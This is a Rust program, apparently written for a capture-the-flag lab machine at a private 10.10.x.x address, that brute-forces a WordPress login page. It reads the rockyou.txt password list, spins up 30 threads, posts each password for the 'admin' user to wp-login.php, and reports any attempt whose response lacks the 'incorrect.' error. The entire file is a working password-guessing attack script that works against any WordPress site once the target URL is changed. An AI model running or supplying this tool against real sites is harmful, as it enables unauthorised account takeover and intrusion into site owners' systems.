use reqwest::{blocking::Client, cookie::Jar };
use std::{collections::HashMap, fs::File, io::{BufRead, BufReader}, sync::Arc};
use threadpool::ThreadPool;
fn test(client: Client, password: &str, target:&str){
    // log=asd&pwd=asd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.187.97%2Fwordpress%2Fwp-admin%2F&testcookie=
    let mut params = HashMap::new();
    params.insert("log", "admin");
    params.insert("pwd", password);
    params.insert("wp-submit", "Log in");
    params.insert("redirect_to", "http://10.10.187.97/wordpress/wp-admin/");
    // params.insert("testcookie", "1");

    let res = client.post(target)
        .form(&params)// This will send the data as application/x-www-form-urlencoded by default
        .send()
        .expect("Error while sendig the request");

    let status = res.status();
    let body = res.text().expect("Error while red the res");
    // println!("{:#}", body);
    if status.is_success() && !body.contains("incorrect."){
        println!("Password Found : {password}");
    }
}
fn main() {

    
    let jar = Arc::new(Jar::default());
    let thread = ThreadPool::new(30);
    let file = File::open("/home/pythonic/Downloads/rockyou.txt").expect("Error while opening the file");
    let target = "http://10.10.187.97/wordpress/wp-login.php";
    let client = Client::builder()
        .cookie_store(true) // Enable cookie storage
        .cookie_provider(jar) // Set the jar for cookies
        .build()
        .expect("Error while building client");

    let reader = BufReader::new(file);

    for f in reader.lines(){

        let client_clone = client.clone();
        // let target_clone = target.clone();
        thread.execute(move || {
            if let Ok(password) = f {
                test(client_clone, &password, target);

            }
        })
    
    }

    thread.join();

    println!("Hello, world!");
}
